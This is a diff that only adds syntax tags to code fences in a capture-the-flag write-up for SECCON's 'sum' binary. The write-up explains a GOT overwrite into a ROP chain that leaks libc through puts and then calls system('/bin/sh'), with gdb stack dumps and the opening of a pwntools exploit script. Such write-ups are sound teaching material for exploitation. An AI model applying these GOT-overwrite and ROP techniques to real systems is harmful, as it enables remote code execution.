@@ -2,7 +2,7 @@
 
 Let's take a look at the binary and libc:
 
-```
+```console
 $    file sum_ccafa40ee6a5a675341787636292bf3c84d17264
 sum_ccafa40ee6a5a675341787636292bf3c84d17264: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=593a57775caa3028bd2ab72873bedaa36734cdb6, not stripped
 $    pwn checksec sum_ccafa40ee6a5a675341787636292bf3c84d17264
@@ -55,7 +55,7 @@ So we can see that it is a `64` bit elf, with a stack canary, and non-executable
 
 When we take a look at the `main` function in ghidra, we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -97,7 +97,7 @@ undefined8 main(void)
 
 When we look at the main function, we see that it first establishes an int array `ints`, that can hold 6 integers. The sixth integer in this array is `amnt`, which is a pointer to the next integer on the stack, `local_18`. First it prints out some text, then calls `read_ints`:
 
-```
+```c
 void read_ints(long ints,long amnt)
 
 {
@@ -127,7 +127,7 @@ void read_ints(long ints,long amnt)
 
 So here we can see it will scan in integers into the array passed by it's first argument, until it either gets a `0` or it scans in `amnt` + 1 integers. Under the context it is called, it will scan in a maximum of `6` integers into the `ints` array. Proceeding that it calls `sum`, with the arguments being the `ints` array and `amnt`:
 
-```
+```c
 ulong sum(long ints,long *x)
 
 {
@@ -158,7 +158,7 @@ So we have a write what where, with no relro or pie. The first problem is that r
 
 Now the next hurdle is getting a libc infoleak. At this point, one of my team-mates mksrg gave me the idea to do a stack pivot. When we take a look at the stack layout when `printf` is called (`exit` will also have this), we see something interesting:
 
-```
+```gdb
 gef➤  b *0x4009bf
 Breakpoint 1 at 0x4009bf
 gef➤  r
@@ -235,14 +235,14 @@ gef➤
 So when `printf` is called, the values on the stack are the numbers that we sent to be added up. Of course, when the `call` instruction happens the return address (the instruction right after the call) will be pushed onto the stack. But after that on the stack, will be values we control. So if we were to overwrite the got address of `printf` with a rop gadget like `pop rdi; ret`, we can start roping.
 
 To find out ROP gadget:
-```
+```console
 $    ROPgadget --binary sum_ccafa40ee6a5a675341787636292bf3c84d17264 | grep "pop rdi"
 0x0000000000400a43 : pop rdi ; ret
 ```
 
 Now for the rop chain itself, it will contain the following values:
 
-```
+```text
 0x00:    popRdi Instruction
 0x08:    got address of puts
 0x10:    plt address of puts
@@ -253,7 +253,7 @@ Now for the rop chain itself, it will contain the following values:
 First off, remember that this chain is executed when `printf` is called, after we overwrite the got address of printf with `0x400a43`. Now this is just a rop chain to give us a libc infoleak by using `puts` to print the got address of `puts`. When I first tried this, I ran into some issues where what I was doing was messing with some of the internals of puts/scanf. I played around with what I was calling, and where I was jumping, and after a little bit I got something that worked. Let's see this rop gadget in action:
 
 First we hit printf:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────── stack ────
 0x00007ffcc5e05900│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi ← $rsp
 0x00007ffcc5e05908│+0x0008: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13
@@ -292,7 +292,7 @@ gef➤
 ```
 
 Then we have an iteration of the `pop rdi; ret` instruction to rid ourselves of the return address pushed onto the stack by `call`:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffcc5e058f8│+0x0000: 0x00000000004009c4  →  <main+193> mov eax, 0x0     ← $rsp
 0x00007ffcc5e05900│+0x0008: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
@@ -376,7 +376,7 @@ gef➤  s
 ```
 
 Next we execute the infoleak by popping the got address of puts into the rdi register:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffcc5e05908│+0x0000: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13     ← $rsp
 0x00007ffcc5e05910│+0x0008: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
@@ -462,7 +462,7 @@ gef➤  x/5i 0x7fc3902639c0
 ```
 
 after that we call `printf`:
-```
+```c
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffcc5e05918│+0x0000: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>     ← $rsp
 0x00007ffcc5e05920│+0x0008: 0x0000000000000000
@@ -493,7 +493,7 @@ gef➤  finish
 ```
 
 Then we end up at `exit`, which will bring us back to the start of `main`:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffcc5e05920│+0x0000: 0x0000000000000000     ← $rsp
 0x00007ffcc5e05928│+0x0008: 0x00007ffcc5e05930  →  0x0000000001202a02
@@ -534,7 +534,7 @@ gef➤
 So now we have a libc infoleak, and a qword write. This is all we need to pwn the code. I initially tried doing a oneshot gadget got overwrite, however none of the conditions were met when it was executed. Then I just did another rop gadget using `printf` again, to just pop the libc address of `/bin/sh` (which we know thanks to the libc infoleak) into the `rdi` register, and then return to system. Let's see the rop chain in action:
 
 First we hit `printf` again:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────── stack ────
 0x00007ffd12150f20│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi ← $rsp
 0x00007ffd12150f28│+0x0008: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)
@@ -573,7 +573,7 @@ gef➤
 ```
 
 Then we have the `pop rdi; ret` to rid ourselves of the return address:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffd12150f18│+0x0000: 0x00000000004009c4  →  <main+193> mov eax, 0x0     ← $rsp
 0x00007ffd12150f20│+0x0008: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
@@ -652,7 +652,7 @@ gef➤
 ```
 
 Then we have the rop gadget to through the address of `/bin/sh` into `rdi`, and return to system:
-```
+```gdb
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007ffd12150f28│+0x0000: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
 0x00007ffd12150f30│+0x0008: 0x00007fab33435440  →  <system+0> test rdi, rdi
@@ -733,7 +733,7 @@ gef➤
 ## Exploit
 
 Putting it all together, we have the following exploit:
-```
+```python
 from pwn import *
 
 # Establish the target
@@ -797,7 +797,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python exploit.py
 [+] Opening connection to sum.chal.seccon.jp on port 10001: Done
 [*] '/home/guyinatuxedo/Desktop/seccon/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264'
